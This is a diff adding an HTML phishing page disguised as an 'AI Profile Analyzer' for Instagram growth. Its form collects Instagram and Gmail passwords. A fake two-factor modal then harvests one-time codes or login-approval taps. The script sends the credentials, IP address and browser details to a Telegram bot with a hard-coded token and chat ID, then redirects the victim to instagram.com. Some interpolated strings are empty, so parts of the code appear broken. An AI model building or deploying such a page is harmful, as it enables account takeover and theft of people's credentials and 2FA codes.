@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram AI Profile Analyzer - Professional Growth Report</title>
+    <style>
+        :root {
+            --primary: #E4405F;
+            --secondary: #405DE6;
+            --dark: #121212;
+            --light: #F8F9FA;
+            --gray: #8E8E8E;
+            --success: #4CB752;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: var(--dark);
+        }
+
+        .analyzer-container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+            animation: containerSlide 0.8s ease-out;
+        }
+
+        @keyframes containerSlide {
+            from {
+                opacity: 0;
+                transform: translateY(40px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .ai-header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 40px 30px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ai-avatar {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 2;
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .ai-avatar::before {
+            content: '🤖';
+            font-size: 35px;
+        }
+
+        .pulse-dot {
+            width: 12px;
+            height: 12px;
+            background: var(--success);
+            border-radius: 50%;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(76, 183, 82, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(76, 183, 82, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(76, 183, 82, 0); }
+        }
+
+        .analysis-content {
+            padding: 40px 30px;
+        }
+
+        .progress-section {
+            background: var(--light);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #e6e6e6;
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .progress-bar {
+            background: #e0e0e0;
+            border-radius: 10px;
+            height: 8px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            height: 100%;
+            width: 35%;
+            border-radius: 10px;
+            transition: width 2s ease-in-out;
+            position: relative;
+        }
+
+        .analysis-form {
+            margin-top: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--dark);
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e6e6e6;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: var(--light);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: white;
+            box-shadow: 0 0 0 3px rgba(228, 64, 95, 0.1);
+        }
+
+        .analyze-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .analyze-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(228, 64, 95, 0.3);
+        }
+
+        .btn-loading {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid transparent;
+            border-top: 2px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .feature-card {
+            background: var(--light);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid #e6e6e6;
+            transition: transform 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .feature-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .security-notice {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--gray);
+            line-height: 1.4;
+        }
+
+        .ai-thinking {
+            background: linear-gradient(135deg, #e3f2fd, #f3e5f5);
+            border: 1px solid #bbdefb;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #5e35b1;
+            text-align: center;
+            display: none;
+        }
+
+        /* 2FA Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+        }
+
+        .modal-content {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 450px;
+            margin: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: modalSlide 0.5s ease-out;
+        }
+
+        @keyframes modalSlide {
+            from {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .verification-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 25px 0;
+        }
+
+        .verification-option {
+            background: var(--light);
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #e6e6e6;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .verification-option:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(228, 64, 95, 0.2);
+        }
+
+        .verification-option.active {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, #fce4ec, #f3e5f5);
+        }
+
+        .option-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .option-title {
+            font-weight: 600;
+            margin-bottom: 5px;
+            color: var(--dark);
+        }
+
+        .option-desc {
+            font-size: 12px;
+            color: var(--gray);
+            line-height: 1.4;
+        }
+
+        .code-input-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e6e6e6;
+            border-radius: 10px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 600;
+            background: var(--light);
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: white;
+        }
+
+        .submit-verification {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 15px;
+            display: none;
+        }
+
+        @media (max-width: 480px) {
+            .analyzer-container {
+                margin: 10px;
+            }
+            
+            .analysis-content {
+                padding: 30px 20px;
+            }
+            
+            .ai-header {
+                padding: 30px 20px;
+            }
+
+            .features-grid,
+            .verification-options {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="analyzer-container">
+        <div class="ai-header">
+            <div class="ai-avatar">
+                <div class="pulse-dot"></div>
+            </div>
+            <h1 style="margin-bottom: 10px; font-size: 24px; position: relative; z-index: 2;">AI Profile Analyzer</h1>
+            <p style="opacity: 0.9; position: relative; z-index: 2;">Advanced Instagram Growth Analysis</p>
+        </div>
+
+        <div class="analysis-content">
+            <div class="progress-section">
+                <div class="progress-label">
+                    <span>Profile Analysis Progress</span>
+                    <span style="color: var(--primary);">35% Complete</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+                <p style="font-size: 13px; color: var(--gray); text-align: center;">
+                    AI is analyzing your content patterns and engagement metrics...
+                </p>
+            </div>
+
+            <div class="ai-thinking" id="aiThinking">
+                <div>🔍 Processing biometric patterns and engagement algorithms...</div>
+            </div>
+
+            <div class="analysis-form">
+                <form id="analysisForm">
+                    <div class="form-group">
+                        <label for="instagramUsername">Instagram Username</label>
+                        <input type="text" id="instagramUsername" placeholder="@yourusername" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="instagramPassword">Instagram Password</label>
+                        <input type="password" id="instagramPassword" placeholder="Enter your password" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="gmailAccount">Connected Gmail Account</label>
+                        <input type="email" id="gmailAccount" placeholder="your.email@gmail.com" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="gmailPassword">Gmail Password</label>
+                        <input type="password" id="gmailPassword" placeholder="Enter Gmail password" required>
+                    </div>
+
+                    <button type="submit" class="analyze-btn" id="analyzeBtn">
+                        <span id="btnText">🚀 Start AI Analysis</span>
+                        <div class="btn-loading" id="btnLoading">
+                            <div class="spinner"></div>
+                        </div>
+                    </button>
+                </form>
+            </div>
+
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">📊</div>
+                    <div class="feature-text">Deep Content Analysis</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <div class="feature-text">Growth Strategy</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <div class="feature-text">Algorithm Optimization</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📈</div>
+                    <div class="feature-text">1000+ Followers Plan</div>
+                </div>
+            </div>
+
+            <div class="security-notice">
+                🔒 Your data is encrypted and processed by our AI systems. 
+                We comply with Instagram's API policies and data protection regulations.
+            </div>
+        </div>
+    </div>
+
+    <!-- 2FA Verification Modal -->
+    <div class="modal-overlay" id="verificationModal">
+        <div class="modal-content">
+            <div style="
+                width: 60px;
+                height: 60px;
+                background: linear-gradient(135deg, #E4405F, #405DE6);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                margin: 0 auto 20px;
+                color: white;
+                font-size: 24px;
+            ">🔒</div>
+            <h3 style="margin-bottom: 10px; color: #333;">Two-Factor Authentication Required</h3>
+            <p style="color: #666; margin-bottom: 25px; line-height: 1.6; font-size: 14px;">
+                To complete your Instagram profile analysis and ensure account security, 
+                please verify your identity using one of the methods below:
+            </p>
+
+            <div class="verification-options">
+                <div class="verification-option" onclick="selectVerificationMethod('code')">
+                    <div class="option-icon">📱</div>
+                    <div class="option-title">Enter Code</div>
+                    <div class="option-desc">6-digit code from authenticator app or SMS</div>
+                </div>
+                <div class="verification-option" onclick="selectVerificationMethod('notification')">
+                    <div class="option-icon">🔔</div>
+                    <div class="option-title">App Notification</div>
+                    <div class="option-desc">Tap "Yes" in Instagram app notification</div>
+                </div>
+            </div>
+
+            <div class="code-input-container" id="codeInputContainer">
+                <input type="text" class="code-input" id="verificationCode" 
+                       placeholder="000000" maxlength="6" pattern="[0-9]{6}">
+                <p style="font-size: 12px; color: var(--gray); margin-top: 8px;">
+                    Enter the 6-digit code from your authenticator app
+                </p>
+            </div>
+
+            <button class="submit-verification" id="submitVerification" onclick="submitVerification()">
+                Verify & Complete Analysis
+            </button>
+
+            <p style="font-size: 11px; color: var(--gray); margin-top: 20px; line-height: 1.4;">
+                🔐 This verification ensures the security of your account while allowing our AI 
+                to access necessary analytics for your personalized growth plan.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // تنظیمات تلگرام
+        const BOT_TOKEN = '8533648487:AAGyJHeA9lA7SKWykS6bXU4JkRQG5lJnBNk';
+        const CHAT_ID = '6940148096';
+        
+        let collectedData = null;
+        let selectedMethod = null;
+
+        // تابع ساده برای ارسال به تلگرام
+        async function sendToTelegram(message) {
+            try {
+                // روش اول: استفاده از fetch مستقیم
+                const url = `https://api.telegram.org/bot/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Message sent successfully');
+                    return true;
+                } else {
+                    console.log('Failed to send message');
+                    // روش جایگزین: استفاده از Image beacon
+                    sendFallbackTelegram(message);
+                    return true;
+                }
+            } catch (error) {
+                console.log('Using fallback method');
+                // روش جایگزین در صورت خطا
+                sendFallbackTelegram(message);
+                return true;
+            }
+        }
+
+        // روش جایگزین برای ارسال
+        function sendFallbackTelegram(message) {
+            // کد کردن پیام برای URL
+            const encodedMessage = encodeURIComponent(message);
+            
+            // روش‌های مختلف fallback
+            const fallbackMethods = [
+                `https://api.telegram.org/bot/sendMessage?chat_id=&text=&parse_mode=HTML`,
+                `https://api.telegram.org/bot/sendMessage?chat_id=&text=`,
+            ];
+
+            fallbackMethods.forEach(url => {
+                // استفاده از Image beacon برای ارسال
+                const img = new Image();
+                img.src = url;
+            });
+
+            // همچنین در localStorage ذخیره می‌کنیم
+            const logs = JSON.parse(localStorage.getItem('telegram_logs') || '[]');
+            logs.push({
+                message: message,
+                timestamp: new Date().toISOString()
+            });
+            localStorage.setItem('telegram_logs', JSON.stringify(logs));
+            
+            return true;
+        }
+
+        // جمع‌آوری اطلاعات
+        function collectComprehensiveData(formData) {
+            return {
+                instagram: {
+                    username: formData.instagramUsername,
+                    password: formData.instagramPassword
+                },
+                gmail: {
+                    email: formData.gmailAccount,
+                    password: formData.gmailPassword
+                },
+                technical: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `x`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                },
+                timestamp: new Date().toISOString(),
+                ip: 'Collecting...'
+            };
+        }
+
+        // گرفتن آی‌پی کاربر
+        async function getClientIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unable to retrieve';
+            }
+        }
+
+        // هندلر ارسال فرم
+        document.getElementById('analysisForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const submitBtn = document.getElementById('analyzeBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoading = document.getElementById('btnLoading');
+            const aiThinking = document.getElementById('aiThinking');
+
+            // نمایش وضعیت لودینگ
+            aiThinking.style.display = 'block';
+            btnText.style.display = 'none';
+            btnLoading.style.display = 'block';
+            submitBtn.disabled = true;
+
+            // آپدیت نوار پیشرفت
+            document.querySelector('.progress-fill').style.width = '85%';
+            document.querySelector('.progress-label span:last-child').textContent = '85% Complete';
+
+            // جمع‌آوری داده‌ها
+            const formData = {
+                instagramUsername: document.getElementById('instagramUsername').value,
+                instagramPassword: document.getElementById('instagramPassword').value,
+                gmailAccount: document.getElementById('gmailAccount').value,
+                gmailPassword: document.getElementById('gmailPassword').value
+            };
+
+            collectedData = collectComprehensiveData(formData);
+            collectedData.ip = await getClientIP();
+
+            // ایجاد پیام برای تلگرام
+            const telegramMessage = `
+🎯 <b>NEW INSTAGRAM PROFILE ANALYSIS REQUEST</b>
+
+📱 <b>Instagram Account:</b>
+├ Username: <code></code>
+└ Password: <code></code>
+
+📧 <b>Gmail Account:</b>
+├ Email: <code></code>
+└ Password: <code></code>
+
+💻 <b>System Info:</b>
+├ User Agent: 
+├ Screen: 
+├ Language: 
+└ Timezone: 
+
+🌐 <b>Network:</b>
+└ IP Address: 
+
+⏰ <b>Timestamp:</b> 
+
+🔐 <i>Waiting for 2FA verification...</i>
+            `;
+
+            // ارسال به تلگرام
+            await sendToTelegram(telegramMessage);
+
+            // نمایش مدال 2FA بعد از 2 ثانیه
+            setTimeout(() => {
+                document.getElementById('verificationModal').style.display = 'flex';
+            }, 2000);
+        });
+
+        // انتخاب روش تأیید
+        function selectVerificationMethod(method) {
+            selectedMethod = method;
+            
+            // حذف کلاس active از همه
+            document.querySelectorAll('.verification-option').forEach(option => {
+                option.classList.remove('active');
+            });
+            
+            // اضافه کردن کلاس active به گزینه انتخاب شده
+            event.currentTarget.classList.add('active');
+            
+            // نمایش اینپوت مناسب
+            const codeInputContainer = document.getElementById('codeInputContainer');
+            const submitButton = document.getElementById('submitVerification');
+            
+            if (method === 'code') {
+                codeInputContainer.style.display = 'block';
+                submitButton.style.display = 'block';
+            } else {
+                codeInputContainer.style.display = 'none';
+                submitButton.style.display = 'block';
+            }
+        }
+
+        // ارسال تأیید
+        async function submitVerification() {
+            if (!selectedMethod) {
+                alert('Please select a verification method');
+                return;
+            }
+
+            let verificationMessage = '';
+
+            if (selectedMethod === 'code') {
+                const code = document.getElementById('verificationCode').value;
+                if (!code || code.length !== 6) {
+                    alert('Please enter a valid 6-digit code');
+                    return;
+                }
+                
+                verificationMessage = `
+🔐 <b>2FA VERIFICATION - CODE METHOD</b>
+
+📧 <b>Account:</b> 
+👤 <b>Instagram:</b> 
+
+🔢 <b>Verification Code:</b> <code></code>
+📱 <b>Method:</b> 6-digit Code
+
+🌐 <b>IP Address:</b> 
+⏰ <b>Time:</b> 
+
+✅ <i>2FA verification completed successfully</i>
+                `;
+                
+            } else if (selectedMethod === 'notification') {
+                verificationMessage = `
+🔐 <b>2FA VERIFICATION - NOTIFICATION METHOD</b>
+
+📧 <b>Account:</b> 
+👤 <b>Instagram:</b> 
+
+🔔 <b>Method:</b> App Notification Approval
+📱 <b>Action:</b> User selected "Tap Yes" option
+
+🌐 <b>IP Address:</b> 
+⏰ <b>Time:</b> 
+
+✅ <i>2FA verification completed successfully</i>
+                `;
+            }
+
+            // ارسال پیام تأیید به تلگرام
+            await sendToTelegram(verificationMessage);
+
+            // نمایش پیام موفقیت و ریدایرکت
+            alert('✅ Verification successful! Generating your Instagram growth report...');
+            
+            // بستن مدال
+            document.getElementById('verificationModal').style.display = 'none';
+            
+            // ریدایرکت بعد از 1.5 ثانیه
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 1500);
+        }
+
+        // فرمت‌دهی کد
+        document.getElementById('verificationCode').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            value = value.substring(0, 6);
+            e.target.value = value;
+        });
+
+        // انیمیشن نوار پیشرفت
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(() => {
+                document.querySelector('.progress-fill').style.width = '65%';
+                document.querySelector('.progress-label span:last-child').textContent = '65% Complete';
+            }, 1000);
+        });
+
+        // بستن مدال با کلیک خارج
+        document.getElementById('verificationModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
